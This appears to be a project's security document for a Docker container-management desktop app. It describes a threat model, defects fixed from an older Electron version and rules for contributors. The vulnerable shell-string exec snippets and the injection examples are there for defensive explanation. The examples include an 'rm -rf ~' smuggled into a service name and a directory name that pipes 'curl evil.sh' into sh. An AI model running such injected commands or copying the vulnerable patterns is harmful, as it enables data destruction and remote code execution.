# Security

## Threat model

A container-management GUI is a privileged tool. Access to the Docker socket is
**root-equivalent on the host** — anyone who can reach it can start a container
that bind-mounts `/` and read or write anything. So the two questions that matter
are:

1. **Who can reach the daemon through us?** Only the local user, through the app
   window. There is no network surface.
2. **Can user-supplied text become a command?** No. Every subprocess is argv, and
   the two fields that reach a subprocess are validated first.

Everything below follows from those two.

## Defects fixed in the port

These were present in the discontinued Electron implementation (`backend/app.js`
in the [previous repository](https://github.com/rajeshpillai/docker-desktop-lite)) and are the reason the rewrite was
worth doing. They are documented here so they are not reintroduced.

### 1. Root-equivalent Docker control exposed to the network

```js
app.use(cors());                                    // any origin
app.listen(3000);                                   // all interfaces
```

An Express server bound to `0.0.0.0:3000` with permissive CORS, in front of a
full `dockerode` client. Anything on the LAN — or any web page the user visited,
via CORS — could list, start, stop, and delete containers, and create new ones
with arbitrary mounts.

**Now:** there is no HTTP server. Commands are Tauri IPC between the WebView and
the Rust process in the same application. No port is bound, no origin is
accepted, and there is nothing to misconfigure.

### 2. Command injection via service name

```js
exec(`docker exec ${containerId} systemctl start ${serviceName}`, ...)
```

`serviceName` came straight from the URL path. A request for
`/containers/abc/services/nginx;%20rm%20-rf%20~/start` executed `rm -rf ~` as the
user running the backend.

**Now:** [`engine.rs::exec_capture()`](../tauri-rs/src-tauri/src/runtime/engine.rs)
uses bollard's `create_exec` with an **argv vector**. There is no shell in the
path at all, so metacharacters are inert. On top of that:

- the action is whitelisted (`start` | `stop` | `restart` | `status`)
- the unit name must match `[A-Za-z0-9.\-_@:\\]{1,128}` and may not begin with
  `-` (which would otherwise be parsed as a flag)

`rejects_shell_metacharacters_in_service_names` asserts eight payloads are
rejected — `;`, `&&`, `|`, `$(…)`, backticks, newline, `>`, and a leading `-`.

### 3. Command injection via compose project directory

```js
const composeFilePath = path.resolve(projectDir, 'docker-compose.yml');
exec(`docker-compose -f ${composeFilePath} up -d`, { cwd: projectDir }, ...)
```

`projectDir` came from the request body. `path.resolve` normalises a path; it does
not escape shell metacharacters. A directory named `/tmp/x; curl evil.sh | sh`
executed.

**Now:** [`compose.rs`](../tauri-rs/src-tauri/src/runtime/compose.rs) builds argv
and passes it to `tokio::process::Command`, never a shell string. The directory is
canonicalised and confirmed to be a directory before use, so a bad path fails
cleanly instead of running the command somewhere unexpected.

### 4. A route that could never work

`GET /containers/:id/services` called `fetchContainerServices()`, which was never
defined anywhere in the codebase. The route always threw and returned 500.

**Now:** implemented via `systemctl list-units --type=service --no-pager --plain
--no-legend`, parsed by `parse_systemctl_units()`, with unit tests covering the
normal output, the bullet-prefixed degraded-unit form, and non-service noise.

### 5. Every error was a 500

`res.status(500)` regardless of what the daemon said, so the UI could not
distinguish "no such container" from "daemon unreachable" from "network still in
use".

**Now:** typed error kinds — see [architecture.md](architecture.md#error-mapping).

## Rules for contributors

These are the invariants that keep the above fixed.

**Never build a shell string.** Use argv:

```rust
// NO
Command::new("sh").arg("-c").arg(format!("docker exec {id} systemctl start {svc}"))

// YES
Command::new(program).args(leading).args(args).current_dir(dir)
// or, better, no subprocess at all:
docker.create_exec(id, CreateExecOptions { cmd: Some(argv), .. })
```

**Compose is the only subprocess.** It has no API — it is a CLI tool — so it is
the one legitimate exception. Everything else goes through the Engine API. If you
find yourself reaching for `Command` elsewhere, check whether bollard already
exposes it.

**Validate anything that reaches argv.** Even without a shell, an unvalidated
value can become a *flag*. `--force` as a "service name" is not a shell injection
but is still a command the user didn't ask for. Hence the leading-`-` rejection in
`validate_service_name()`.

**Whitelist verbs, don't blacklist characters.** The action parameter is matched
against a fixed set. Adding a new one is a deliberate edit.

**Canonicalise paths before use.** `resolve_project_dir()` calls `canonicalize()`
and checks `is_dir()`.

**Don't widen the capability set casually.**
[`capabilities/default.json`](../tauri-rs/src-tauri/capabilities/default.json)
grants `core:default`, `opener:default`, and `dialog:allow-open` — the last only
so the compose view can open a directory picker. The CSP in
[`tauri.conf.json`](../tauri-rs/src-tauri/tauri.conf.json) restricts the WebView
to `'self'` plus the IPC origin; there is no remote content and no reason for
there to be.

## What is *not* claimed

- **We do not sandbox the daemon.** If your user can reach the Docker socket, so
  can this app, by design. It is a management tool.
- **Container images are not scanned.** Vulnerability scanning (Trivy/Grype) is
  on the roadmap, not implemented.
- **Registry credentials are not managed.** Pulls use the daemon's existing auth;
  we pass `None` for credentials and never read `~/.docker/config.json`.
- **No formal audit** has been performed. The claims above describe specific
  defects fixed and specific tests that pin them.
